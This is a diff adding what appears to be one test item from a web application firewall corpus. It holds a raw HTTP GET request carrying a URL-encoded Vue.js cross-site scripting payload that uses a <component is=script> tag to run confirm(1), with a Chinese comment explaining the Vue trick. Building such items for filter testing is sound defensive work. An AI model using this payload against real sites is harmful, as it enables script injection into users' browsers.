@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_VueJS-06506748
+# 在 Vue.js 中，可以使用 <component> 元素来动态地渲染组件，而 is 属性用于指定要渲染的组件的名称或组件对象。
+GET /?id=%3Ccomponent%20is=script%20text=confirm%281%29%3E&bid=hd_tag_m8mv25e8 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25e8
+RM-PRO-Token: 24dcf4c908e77bb0899b2f271b9467cb
+RM-PRO-Time: 1742808463415
+User-Agent: curl/7.83.1
+
